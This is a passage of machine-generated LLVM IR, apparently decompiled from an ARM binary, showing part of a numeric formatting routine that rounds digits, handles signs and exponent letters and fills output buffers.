dec_label_pc_1a708:                               ; preds = %dec_label_pc_1a6e4
  %v2_1a708 = ptrtoint i32* %stack_var_-82 to i32
  %v2_1a70c = add i32 %v1_1a70c, %v2_1a708
  store i32 %v2_1a70c, i32* %r3.global-to-local, align 4
  %v1_1a710 = add i32 %v2_1a70c, 2
  %v2_1a710 = inttoptr i32 %v1_1a710 to i8*
  %v3_1a710 = load i8, i8* %v2_1a710, align 1
  %v4_1a710 = zext i8 %v3_1a710 to i32
  store i32 %v4_1a710, i32* %r2.global-to-local, align 4
  store i32 %v1_1a710, i32* %r1.global-to-local, align 4
  %v2_1a718 = icmp ugt i8 %v3_1a710, 51
  %v7_1a718 = icmp eq i8 %v3_1a710, 52
  store i1 %v7_1a718, i1* %cpsr_z.global-to-local, align 1
  %v2_1a71c = xor i1 %v2_1a718, true
  %v3_1a71c = or i1 %v7_1a718, %v2_1a71c
  br i1 %v3_1a71c, label %bb222, label %bb223

bb222:                                            ; preds = %dec_label_pc_1a708
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb223

bb223:                                            ; preds = %dec_label_pc_1a708, %bb222
  %v1_1a72890 = phi i32 [ %v1_1a72892, %dec_label_pc_1a708 ], [ 0, %bb222 ]
  %v2_1a720 = xor i1 %v7_1a718, true
  %v3_1a720 = and i1 %v2_1a718, %v2_1a720
  br i1 %v3_1a720, label %bb224, label %.preheader

bb224:                                            ; preds = %bb223
  store i32 1, i32* %r0.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %bb223, %bb224, %.thread140, %._crit_edge87
  %v0_1a724 = phi i32 [ %v0_1a724.pre, %._crit_edge87 ], [ %v7_1a6fc137141, %.thread140 ], [ %v1_1a710, %bb223 ], [ %v1_1a710, %bb224 ]
  %v1_1a728 = phi i32 [ %v1_1a728.pre, %._crit_edge87 ], [ 0, %.thread140 ], [ %v1_1a72890, %bb223 ], [ 1, %bb224 ]
  %v1_1a724 = add i32 %v0_1a724, -1
  %v2_1a724 = inttoptr i32 %v1_1a724 to i8*
  %v3_1a724 = load i8, i8* %v2_1a724, align 1
  %v4_1a724 = zext i8 %v3_1a724 to i32
  store i32 %v1_1a724, i32* %r1.global-to-local, align 4
  %v2_1a728 = add i32 %v4_1a724, %v1_1a728
  %v1_1a72c = urem i32 %v2_1a728, 256
  store i32 %v1_1a72c, i32* %r3.global-to-local, align 4
  %v2_1a730 = icmp ugt i32 %v1_1a72c, 56
  %v7_1a730 = icmp eq i32 %v1_1a72c, 57
  store i1 %v7_1a730, i1* %cpsr_z.global-to-local, align 1
  %v2_1a734 = xor i1 %v2_1a730, true
  %v3_1a734 = or i1 %v7_1a730, %v2_1a734
  br i1 %v3_1a734, label %bb225, label %bb226

bb225:                                            ; preds = %.preheader
  store i32 0, i32* %r2.global-to-local, align 4
  br label %bb226

bb226:                                            ; preds = %.preheader, %bb225
  %v2_1a738 = xor i1 %v7_1a730, true
  %v3_1a738 = and i1 %v2_1a730, %v2_1a738
  br i1 %v3_1a738, label %bb227, label %bb226.bb228_crit_edge

bb226.bb228_crit_edge:                            ; preds = %bb226
  %v1_1a740.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb228

bb227:                                            ; preds = %bb226
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb228

bb228:                                            ; preds = %bb226.bb228_crit_edge, %bb227
  %v1_1a740 = phi i32 [ %v1_1a740.pre, %bb226.bb228_crit_edge ], [ 1, %bb227 ]
  %v7_1a73c = icmp eq i32 %v1_1a72c, 48
  store i1 %v7_1a73c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a73c, label %bb229, label %._crit_edge93

bb229:                                            ; preds = %bb228
  %v2_1a740 = or i32 %v1_1a740, 1
  store i32 %v2_1a740, i32* %r2.global-to-local, align 4
  br label %._crit_edge93

._crit_edge93:                                    ; preds = %bb228, %bb229
  %v0_1a744 = phi i32 [ 1, %bb229 ], [ %v1_1a740, %bb228 ]
  %v2_1a744 = icmp eq i32 %v0_1a744, 0
  store i1 %v2_1a744, i1* %cpsr_z.global-to-local, align 1
  %v1_1a748 = trunc i32 %v2_1a728 to i8
  store i8 %v1_1a748, i8* %v2_1a724, align 1
  %v0_1a74c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1a74c, label %dec_label_pc_1a750, label %._crit_edge87

._crit_edge87:                                    ; preds = %._crit_edge93
  %v1_1a728.pre = load i32, i32* %r0.global-to-local, align 4
  %v0_1a724.pre = load i32, i32* %r1.global-to-local, align 4
  br label %.preheader

dec_label_pc_1a750:                               ; preds = %._crit_edge93
  store i32 %v2_1a6f4, i32* %r2.global-to-local, align 4
  %v2_1a754 = ptrtoint i32* %stack_var_-82 to i32
  store i32 %v2_1a754, i32* %r3.global-to-local, align 4
  %v0_1a758 = load i32, i32* %r1.global-to-local, align 4
  %v3_1a758 = icmp uge i32 %v0_1a758, %v2_1a754
  %v9_1a758 = icmp eq i32 %v0_1a758, %v2_1a754
  store i1 %v9_1a758, i1* %cpsr_z.global-to-local, align 1
  %v2_1a75c = xor i1 %v3_1a758, true
  %v3_1a75c = or i1 %v9_1a758, %v2_1a75c
  br i1 %v3_1a75c, label %bb230, label %.thread145

bb230:                                            ; preds = %dec_label_pc_1a750
  store i32 %stack_var_-192.5, i32* @lr, align 4
  store i32 %v2_1a754, i32* %r2.global-to-local, align 4
  store i32 %v2_1a754, i32* %r1.global-to-local, align 4
  br label %.thread145

.thread145:                                       ; preds = %dec_label_pc_1a750, %bb230
  %v2_1a77c = phi i32 [ %v2_1a754, %bb230 ], [ %v0_1a758, %dec_label_pc_1a750 ]
  %v4_1a770144 = phi i32 [ %v2_1a754, %bb230 ], [ %v2_1a6f4, %dec_label_pc_1a750 ]
  %v2_1a768 = xor i1 %v9_1a758, true
  %v3_1a768 = and i1 %v3_1a758, %v2_1a768
  br i1 %v3_1a768, label %bb231, label %bb232

bb231:                                            ; preds = %.thread145
  store i32 %stack_var_-192.5, i32* %r0.global-to-local, align 4
  br label %bb232

bb232:                                            ; preds = %.thread145, %bb231
  br i1 %v3_1a75c, label %bb233, label %bb234

bb233:                                            ; preds = %bb232
  %v4_1a76c = load i32, i32* @lr, align 4
  %v5_1a76c = add i32 %v4_1a76c, 1
  store i32 %v5_1a76c, i32* %r0.global-to-local, align 4
  br label %bb234

bb234:                                            ; preds = %bb232, %bb233
  br i1 %v3_1a768, label %bb235, label %bb236

bb235:                                            ; preds = %bb234
  %v5_1a770 = add i32 %v4_1a770144, 2
  store i32 %v5_1a770, i32* %r2.global-to-local, align 4
  br label %bb236

bb236:                                            ; preds = %bb234, %bb235
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_1a778 = load i32, i32* %sb.global-to-local, align 4
  %v7_1a778 = icmp eq i32 %v0_1a778, 103
  store i1 %v7_1a778, i1* %cpsr_z.global-to-local, align 1
  %v3_1a77c = add i32 %v2_1a77c, 1
  %v4_1a77c = inttoptr i32 %v3_1a77c to i8*
  store i8 0, i8* %v4_1a77c, align 1
  %v0_1a780 = load i32, i32* %r1.global-to-local, align 4
  %v1_1a780 = add i32 %v0_1a780, 1
  store i32 %v1_1a780, i32* %lr.global-to-local, align 4
  %v0_1a784 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1a784, label %dec_label_pc_1a788, label %dec_label_pc_1a7b0

dec_label_pc_1a788:                               ; preds = %bb236
  %v0_1a788 = load i32, i32* %r0.global-to-local, align 4
  %v1_1a788 = load i32, i32* %ip.global-to-local, align 4
  %v2_1a788 = sub i32 %v0_1a788, %v1_1a788
  %v4_1a788 = xor i32 %v1_1a788, %v0_1a788
  %v5_1a788 = xor i32 %v2_1a788, %v0_1a788
  %v6_1a788 = and i32 %v5_1a788, %v4_1a788
  %v7_1a788 = icmp slt i32 %v6_1a788, 0
  %v8_1a788 = icmp slt i32 %v2_1a788, 0
  %v9_1a788 = icmp eq i32 %v0_1a788, %v1_1a788
  %v3_1a78c = xor i1 %v8_1a788, %v7_1a788
  %v4_1a78c = or i1 %v9_1a788, %v3_1a78c
  %.258 = zext i1 %v4_1a78c to i32
  store i32 %.258, i32* %r3.global-to-local, align 4
  %v1_1a794 = add i32 %v0_1a788, 4
  %v3_1a794 = sub i32 0, %v0_1a788
  %v4_1a794 = and i32 %v1_1a794, %v3_1a794
  %v5_1a794 = icmp slt i32 %v4_1a794, 0
  %v6_1a794 = icmp slt i32 %v1_1a794, 0
  %v7_1a794 = icmp eq i32 %v1_1a794, 0
  store i1 %v7_1a794, i1* %cpsr_z.global-to-local, align 1
  %v2_1a798 = xor i1 %v6_1a794, %v5_1a794
  br i1 %v2_1a798, label %.thread21, label %bb239

.thread21:                                        ; preds = %dec_label_pc_1a788
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1aacc

bb239:                                            ; preds = %dec_label_pc_1a788
  %v2_1a79c = icmp eq i1 %v4_1a78c, false
  store i1 %v2_1a79c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a79c, label %dec_label_pc_1aacc, label %.thread24

.thread24:                                        ; preds = %bb239
  %v3_1a7a0 = sub i32 %v1_1a788, %v0_1a788
  store i32 %v3_1a7a0, i32* %fp.global-to-local, align 4
  store i32 102, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1a7bc

dec_label_pc_1a7b0:                               ; preds = %bb236
  %v0_1a7b0 = load i32, i32* %sb.global-to-local, align 4
  %v7_1a7b0 = icmp eq i32 %v0_1a7b0, 102
  store i1 %v7_1a7b0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_1a7b0, i32* %r8.global-to-local, align 4
  br i1 %v7_1a7b0, label %dec_label_pc_1a7b0.dec_label_pc_1a7bc_crit_edge, label %dec_label_pc_1a7cc

dec_label_pc_1a7b0.dec_label_pc_1a7bc_crit_edge:  ; preds = %dec_label_pc_1a7b0
  %v0_1a7bc.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a7bc

dec_label_pc_1a7bc:                               ; preds = %.thread24, %dec_label_pc_1a7b0.dec_label_pc_1a7bc_crit_edge
  %v0_1a7bc = phi i32 [ %v0_1a7bc.pre, %dec_label_pc_1a7b0.dec_label_pc_1a7bc_crit_edge ], [ %v0_1a788, %.thread24 ]
  %v1_1a7bc = icmp slt i32 %v0_1a7bc, 0
  %v2_1a7bc = icmp eq i32 %v0_1a7bc, 0
  store i1 %v2_1a7bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_1a7bc, label %bb240, label %dec_label_pc_1a7cc

bb240:                                            ; preds = %dec_label_pc_1a7bc
  store i32 48, i32* %r3.global-to-local, align 4
  %v5_1a7c4 = load i32, i32* %r2.global-to-local, align 4
  %v6_1a7c4 = add i32 %v5_1a7c4, -1
  %v7_1a7c4 = inttoptr i32 %v6_1a7c4 to i8*
  store i8 48, i8* %v7_1a7c4, align 1
  %v8_1a7c4 = load i32, i32* %r2.global-to-local, align 4
  %v9_1a7c4 = add i32 %v8_1a7c4, -1
  store i32 %v9_1a7c4, i32* %r2.global-to-local, align 4
  %v0_1a7c8.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_1a7fc.pre.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_1a7cc

dec_label_pc_1a7cc:                               ; preds = %bb240, %dec_label_pc_1a7bc, %dec_label_pc_1aacc, %dec_label_pc_1a7b0
  %v1_1a7fc = phi i32 [ %v1_1a780, %dec_label_pc_1a7b0 ], [ %v1_1a780, %dec_label_pc_1aacc ], [ %v1_1a7fc.pre.pre, %bb240 ], [ %v1_1a780, %dec_label_pc_1a7bc ]
  %v1_1a87430 = phi i32 [ 0, %dec_label_pc_1a7b0 ], [ 0, %dec_label_pc_1aacc ], [ %v0_1a7c8.pre, %bb240 ], [ %v0_1a7bc, %dec_label_pc_1a7bc ]
  store i32 %v1_1a87430, i32* %r1.global-to-local, align 4
  store i32 1, i32* %stack_var_-164, align 4
  store i32 176, i32* %r4.global-to-local, align 4
  %v2_1a7d8 = ptrtoint i32* %stack_var_-42 to i32
  store i32 %v2_1a7d8, i32* %r3.global-to-local, align 4
  %v0_1a7e4 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a7e4 = inttoptr i32 %v0_1a7e4 to i8*
  %v2_1a7e4 = load i8, i8* %v1_1a7e4, align 1
  %v3_1a7e4 = zext i8 %v2_1a7e4 to i32
  store i32 %v3_1a7e4, i32* %r3.global-to-local, align 4
  %v5_1a7e4 = add i32 %v0_1a7e4, 1
  store i32 %v5_1a7e4, i32* %r2.global-to-local, align 4
  %v1_1a7e8 = icmp slt i32 %v1_1a87430, 0
  %v2_1a7e8 = icmp eq i32 %v1_1a87430, 0
  store i1 %v2_1a7e8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r5.global-to-local, align 4
  store i32 %v5_1a7e4, i32* %r6.global-to-local, align 4
  store i32 %v3_1a7e4, i32* %stack_var_-42, align 4
  %v2_1a7fc = sub i32 %v1_1a7fc, %v5_1a7e4
  store i32 %v2_1a7fc, i32* %ip.global-to-local, align 4
  br i1 %v1_1a7e8, label %.thread, label %dec_label_pc_1a808

.thread:                                          ; preds = %dec_label_pc_1a7cc
  %v5_1a800 = ptrtoint i32* %stack_var_-156 to i32
  store i32 %v5_1a800, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1a884

dec_label_pc_1a808:                               ; preds = %dec_label_pc_1a7cc
  store i32 112, i32* %r3.global-to-local, align 4
  %v2_1a80c = sub i32 %v1_1a87430, %v2_1a7fc
  %v4_1a80c = xor i32 %v2_1a7fc, %v1_1a87430
  %v5_1a80c = xor i32 %v2_1a80c, %v1_1a87430
  %v6_1a80c = and i32 %v5_1a80c, %v4_1a80c
  %v7_1a80c = icmp slt i32 %v6_1a80c, 0
  %v8_1a80c = icmp slt i32 %v2_1a80c, 0
  %v9_1a80c = icmp eq i32 %v1_1a87430, %v2_1a7fc
  store i1 %v9_1a80c, i1* %cpsr_z.global-to-local, align 1
  store i32 112, i32* %stack_var_-156, align 4
  %v2_1a818 = xor i1 %v8_1a80c, %v7_1a80c
  br i1 %v2_1a818, label %dec_label_pc_1a864, label %dec_label_pc_1a81c

dec_label_pc_1a81c:                               ; preds = %dec_label_pc_1a808
  store i32 %v2_1a80c, i32* %r2.global-to-local, align 4
  %v2_1a820 = icmp eq i32 %v2_1a80c, 0
  store i1 %v2_1a820, i1* %cpsr_z.global-to-local, align 1
  %v2_1a824 = ptrtoint i32* %stack_var_-180 to i32
  store i32 %v2_1a824, i32* %lr.global-to-local, align 4
  %tmp241 = icmp slt i32 %v2_1a80c, 1
  br i1 %tmp241, label %.thread148, label %dec_label_pc_1a838

.thread148:                                       ; preds = %dec_label_pc_1a81c
  %v7_1a82c = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v7_1a82c, i32* %r7.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %.thread34

dec_label_pc_1a838:                               ; preds = %dec_label_pc_1a81c
  store i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 -33473), i32* %r3.global-to-local, align 4
  %v2_1a848 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_1a848, i32* %r7.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 -1, i32* %r1.global-to-local, align 4
  store i32 176, i32* %stack_var_-144, align 4
  br label %dec_label_pc_1a884

dec_label_pc_1a864:                               ; preds = %dec_label_pc_1a808
  store i1 %v2_1a7e8, i1* %cpsr_z.global-to-local, align 1
  %v2_1a868 = ptrtoint i32* %stack_var_-180 to i32
  store i32 %v2_1a868, i32* %lr.global-to-local, align 4
  br i1 %v2_1a7e8, label %bb242, label %bb243

bb242:                                            ; preds = %dec_label_pc_1a864
  %v3_1a870 = ptrtoint i32* %stack_var_-156 to i32
  store i32 %v3_1a870, i32* %r7.global-to-local, align 4
  br label %.thread34

bb243:                                            ; preds = %dec_label_pc_1a864
  %v3_1a874 = sub i32 %v2_1a7fc, %v1_1a87430
  store i32 %v3_1a874, i32* %ip.global-to-local, align 4
  %v3_1a87863 = add i32 %v5_1a7e4, %v1_1a87430
  store i32 %v3_1a87863, i32* %r6.global-to-local, align 4
  %v3_1a87c = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v3_1a87c, i32* %r7.global-to-local, align 4
  br label %.thread34

.thread34:                                        ; preds = %.thread148, %bb242, %bb243
  %v1_1a8c4265 = phi i32 [ %v3_1a870, %bb242 ], [ %v3_1a87c, %bb243 ], [ %v7_1a82c, %.thread148 ]
  %v0_1a898102 = phi i32 [ %v2_1a7fc, %bb242 ], [ %v3_1a874, %bb243 ], [ 0, %.thread148 ]
  store i32 -1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1a884

dec_label_pc_1a884:                               ; preds = %.thread, %dec_label_pc_1a838, %.thread34
  %v1_1a8c4 = phi i32 [ %v2_1a848, %dec_label_pc_1a838 ], [ %v1_1a8c4265, %.thread34 ], [ %v5_1a800, %.thread ]
  %v0_1a8d8109 = phi i32 [ -1, %dec_label_pc_1a838 ], [ -1, %.thread34 ], [ %v1_1a87430, %.thread ]
  %v0_1a898 = phi i32 [ 0, %dec_label_pc_1a838 ], [ %v0_1a898102, %.thread34 ], [ %v2_1a7fc, %.thread ]
  %v3_1a884 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_1a884, i32* %r2.global-to-local, align 4
  %v1_1a888 = add i32 %v3_1a884, 12
  %v2_1a888 = inttoptr i32 %v1_1a888 to i32*
  %v3_1a888 = load i32, i32* %v2_1a888, align 4
  %v1_1a88c = and i32 %v3_1a888, 16
  store i32 %v1_1a88c, i32* %r4.global-to-local, align 4
  %v2_1a88c = icmp eq i32 %v1_1a88c, 0
  %tmp270 = zext i1 %v2_1a88c to i32
  %.259 = xor i32 %tmp270, 1
  store i32 %.259, i32* %r3.global-to-local, align 4
  %v2_1a898 = icmp eq i32 %v0_1a898, 0
  store i1 %v2_1a898, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a898, label %bb246, label %.thread37

.thread37:                                        ; preds = %dec_label_pc_1a884
  store i32 1, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1a8b4

bb246:                                            ; preds = %dec_label_pc_1a884
  store i1 %v2_1a88c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a88c, label %dec_label_pc_1a8a8, label %dec_label_pc_1a8b4

dec_label_pc_1a8a8:                               ; preds = %bb246
  %v0_1a8a8 = load i32, i32* %sb.global-to-local, align 4
  %v7_1a8a8 = icmp eq i32 %v0_1a8a8, 103
  store i1 %v7_1a8a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a8a8, label %dec_label_pc_1a8d8, label %bb247

bb247:                                            ; preds = %dec_label_pc_1a8a8
  %v1_1a8ac = load i32, i32* %fp.global-to-local, align 4
  %v3_1a8ac = icmp eq i32 %v1_1a8ac, 0
  store i1 %v3_1a8ac, i1* %cpsr_z.global-to-local, align 1
  %tmp248 = icmp slt i32 %v1_1a8ac, 1
  br i1 %tmp248, label %dec_label_pc_1a8d8, label %dec_label_pc_1a8b4

dec_label_pc_1a8b4:                               ; preds = %.thread37, %bb246, %bb247
  store i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32* %lr.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 -33476), i32* %r3.global-to-local, align 4
  %v2_1a8c4 = inttoptr i32 %v1_1a8c4 to i32*
  store i32 112, i32* %v2_1a8c4, align 4
  %v0_1a8c8 = load i32, i32* %r3.global-to-local, align 4
  %v1_1a8c8 = add i32 %v0_1a8c8, 16
  store i32 %v1_1a8c8, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_1a8d0 = load i32, i32* %r7.global-to-local, align 4
  %v1_1a8d0 = add i32 %v0_1a8d0, 4
  %v2_1a8d0 = inttoptr i32 %v1_1a8d0 to i32*
  store i32 1, i32* %v2_1a8d0, align 4
  %v4_1a8d0 = add i32 %v0_1a8d0, 8
  %v5_1a8d0 = inttoptr i32 %v4_1a8d0 to i32*
  %v6_1a8d0 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v6_1a8d0, i32* %v5_1a8d0, align 4
  %v0_1a8d4 = load i32, i32* %r7.global-to-local, align 4
  %v1_1a8d4 = add i32 %v0_1a8d4, 12
  store i32 %v1_1a8d4, i32* %r7.global-to-local, align 4
  %v0_1a8d8.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1a8d8

dec_label_pc_1a8d8:                               ; preds = %dec_label_pc_1a8a8, %bb247, %dec_label_pc_1a8b4
  %v1_1a8f8 = phi i32 [ %v1_1a8c4, %bb247 ], [ %v1_1a8d4, %dec_label_pc_1a8b4 ], [ %v1_1a8c4, %dec_label_pc_1a8a8 ]
  %v0_1a8d8 = phi i32 [ %v0_1a8d8109, %bb247 ], [ %v0_1a8d8.pre, %dec_label_pc_1a8b4 ], [ %v0_1a8d8109, %dec_label_pc_1a8a8 ]
  %v1_1a8d8 = add i32 %v0_1a8d8, 1
  store i32 %v1_1a8d8, i32* %lr.global-to-local, align 4
  %v6_1a8d8 = icmp slt i32 %v1_1a8d8, 0
  %v7_1a8d8 = icmp eq i32 %v1_1a8d8, 0
  store i1 %v7_1a8d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v6_1a8d8, label %dec_label_pc_1a8e0, label %dec_label_pc_1a904

dec_label_pc_1a8e0:                               ; preds = %dec_label_pc_1a8d8
  store i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 -33473), i32* %r3.global-to-local, align 4
  %v1_1a8f0 = sub i32 -1, %v0_1a8d8
  store i32 %v1_1a8f0, i32* %r1.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  %v2_1a8f8 = inttoptr i32 %v1_1a8f8 to i32*
  store i32 176, i32* %v2_1a8f8, align 4
  %v0_1a8fc = load i32, i32* %r7.global-to-local, align 4
  %v1_1a8fc = add i32 %v0_1a8fc, 4
  %v2_1a8fc = inttoptr i32 %v1_1a8fc to i32*
  %v3_1a8fc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v3_1a8fc, i32* %v2_1a8fc, align 4
  %v4_1a8fc = add i32 %v0_1a8fc, 8
  %v5_1a8fc = inttoptr i32 %v4_1a8fc to i32*
  %v6_1a8fc = load i32, i32* %r3.global-to-local, align 4
  store i32 %v6_1a8fc, i32* %v5_1a8fc, align 4
  %v0_1a900 = load i32, i32* %r7.global-to-local, align 4
  %v1_1a900 = add i32 %v0_1a900, 12
  store i32 %v1_1a900, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1a904

dec_label_pc_1a904:                               ; preds = %dec_label_pc_1a8d8, %dec_label_pc_1a8e0
  %v2_1a90c = phi i32 [ %v1_1a8f8, %dec_label_pc_1a8d8 ], [ %v1_1a900, %dec_label_pc_1a8e0 ]
  %v0_1a904 = load i32, i32* %ip.global-to-local, align 4
  %v2_1a904 = icmp eq i32 %v0_1a904, 0
  store i1 %v2_1a904, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a904, label %.thread46, label %bb249

bb249:                                            ; preds = %dec_label_pc_1a904
  store i32 112, i32* %r3.global-to-local, align 4
  %v3_1a90c = inttoptr i32 %v2_1a90c to i32*
  store i32 112, i32* %v3_1a90c, align 4
  %v1_1a910 = load i32, i32* %r6.global-to-local, align 4
  %v2_1a910 = load i32, i32* %r7.global-to-local, align 4
  %v3_1a910 = add i32 %v2_1a910, 8
  %v4_1a910 = inttoptr i32 %v3_1a910 to i32*
  store i32 %v1_1a910, i32* %v4_1a910, align 4
  %v1_1a914 = load i32, i32* %ip.global-to-local, align 4
  %v2_1a914 = load i32, i32* %r7.global-to-local, align 4
  %v3_1a914 = add i32 %v2_1a914, 4
  %v4_1a914 = inttoptr i32 %v3_1a914 to i32*
  store i32 %v1_1a914, i32* %v4_1a914, align 4
  %v1_1a918 = load i32, i32* %r7.global-to-local, align 4
  %v2_1a918 = add i32 %v1_1a918, 12
  store i32 %v2_1a918, i32* %r7.global-to-local, align 4
  br label %.thread46

.thread46:                                        ; preds = %dec_label_pc_1a904, %bb249
  %v1_1a950 = phi i32 [ %v2_1a90c, %dec_label_pc_1a904 ], [ %v2_1a918, %bb249 ]
  %v0_1a91c = load i32, i32* %sb.global-to-local, align 4
  %v7_1a91c = icmp eq i32 %v0_1a91c, 103
  store i1 %v7_1a91c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a91c, label %dec_label_pc_1a924, label %dec_label_pc_1a92c

dec_label_pc_1a924:                               ; preds = %.thread46
  %v0_1a924 = load i32, i32* %r4.global-to-local, align 4
  %v2_1a924 = icmp eq i32 %v0_1a924, 0
  store i1 %v2_1a924, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a924, label %dec_label_pc_1a95c, label %dec_label_pc_1a92c

dec_label_pc_1a92c:                               ; preds = %.thread46, %dec_label_pc_1a924
  %v0_1a92c = load i32, i32* %lr.global-to-local, align 4
  %v1_1a92c = load i32, i32* %ip.global-to-local, align 4
  %v2_1a92c = sub i32 %v1_1a92c, %v0_1a92c
  store i32 %v2_1a92c, i32* %r1.global-to-local, align 4
  %v1_1a930 = load i32, i32* %fp.global-to-local, align 4
  %v2_1a930 = sub i32 %v2_1a92c, %v1_1a930
  %v4_1a930 = xor i32 %v1_1a930, %v2_1a92c
  %v5_1a930 = xor i32 %v2_1a930, %v2_1a92c
  %v6_1a930 = and i32 %v5_1a930, %v4_1a930
  %v7_1a930 = icmp slt i32 %v6_1a930, 0
  %v8_1a930 = icmp slt i32 %v2_1a930, 0
  %v9_1a930 = icmp eq i32 %v2_1a92c, %v1_1a930
  store i1 %v9_1a930, i1* %cpsr_z.global-to-local, align 1
  %v2_1a934 = xor i1 %v8_1a930, %v7_1a930
  br i1 %v2_1a934, label %dec_label_pc_1a938, label %dec_label_pc_1a95c

dec_label_pc_1a938:                               ; preds = %dec_label_pc_1a92c
  %v2_1a944 = sub i32 %v1_1a930, %v2_1a92c
  store i32 %v2_1a944, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 -33473), i32* %r3.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  %v2_1a950 = inttoptr i32 %v1_1a950 to i32*
  store i32 176, i32* %v2_1a950, align 4
  %v0_1a954 = load i32, i32* %r7.global-to-local, align 4
  %v1_1a954 = add i32 %v0_1a954, 4
  %v2_1a954 = inttoptr i32 %v1_1a954 to i32*
  %v3_1a954 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v3_1a954, i32* %v2_1a954, align 4
  %v4_1a954 = add i32 %v0_1a954, 8
  %v5_1a954 = inttoptr i32 %v4_1a954 to i32*
  %v6_1a954 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v6_1a954, i32* %v5_1a954, align 4
  %v0_1a958 = load i32, i32* %r7.global-to-local, align 4
  %v1_1a958 = add i32 %v0_1a958, 12
  store i32 %v1_1a958, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1a95c

dec_label_pc_1a95c:                               ; preds = %dec_label_pc_1a92c, %dec_label_pc_1a924, %dec_label_pc_1a938
  %v1_1a9f0.pre.pre = phi i32 [ %v1_1a950, %dec_label_pc_1a92c ], [ %v1_1a950, %dec_label_pc_1a924 ], [ %v1_1a958, %dec_label_pc_1a938 ]
  %v0_1a95c = load i32, i32* %r8.global-to-local, align 4
  %v7_1a95c = icmp eq i32 %v0_1a95c, 102
  store i1 %v7_1a95c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a95c, label %dec_label_pc_1a9e4, label %dec_label_pc_1a964

dec_label_pc_1a964:                               ; preds = %dec_label_pc_1a95c
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_1a968 = load i32, i32* %r0.global-to-local, align 4
  %v1_1a968 = icmp slt i32 %v0_1a968, 0
  %v2_1a968 = icmp eq i32 %v0_1a968, 0
  store i1 %v2_1a968, i1* %cpsr_z.global-to-local, align 1
  %v4_1a96c = select i1 %tmp275, i32 %v4_1a688126130, i32 101
  store i32 %v4_1a96c, i32* %r4.global-to-local, align 4
  store i32 0, i32* %stack_var_-47, align 4
  %v4_1a97c = sub i32 0, %v0_1a968
  %storemerge158 = select i1 %v1_1a968, i32 %v4_1a97c, i32 %v0_1a968
  %tmp271 = ashr i32 %v0_1a968, 31
  %tmp272 = and i32 %tmp271, 2
  %tmp273 = add nuw nsw i32 %tmp272, 43
  store i32 %storemerge158, i32* %r5.global-to-local, align 4
  store i32 %tmp273, i32* %sl.global-to-local, align 4
  %v2_1a984 = ptrtoint i32* %stack_var_-47 to i32
  store i32 %v2_1a984, i32* %r6.global-to-local, align 4
  store i32 2, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1a98c

dec_label_pc_1a98c:                               ; preds = %dec_label_pc_1a9bc, %dec_label_pc_1a98c, %dec_label_pc_1a964
  %v2_1a9a4 = phi i32 [ %v2_1a984, %dec_label_pc_1a964 ], [ %v6_1a9a4, %dec_label_pc_1a98c ], [ %v6_1a9a4, %dec_label_pc_1a9bc ]
  %v0_1a99c = phi i32 [ %storemerge158, %dec_label_pc_1a964 ], [ %v2_1a9a8, %dec_label_pc_1a98c ], [ %v2_1a9a8, %dec_label_pc_1a9bc ]
  %v3_1a994 = urem i32 %v0_1a99c, 10
  %v1_1a998 = or i32 %v3_1a994, 48
  store i32 %v1_1a998, i32* %r3.global-to-local, align 4
  store i32 %v0_1a99c, i32* %r0.global-to-local, align 4
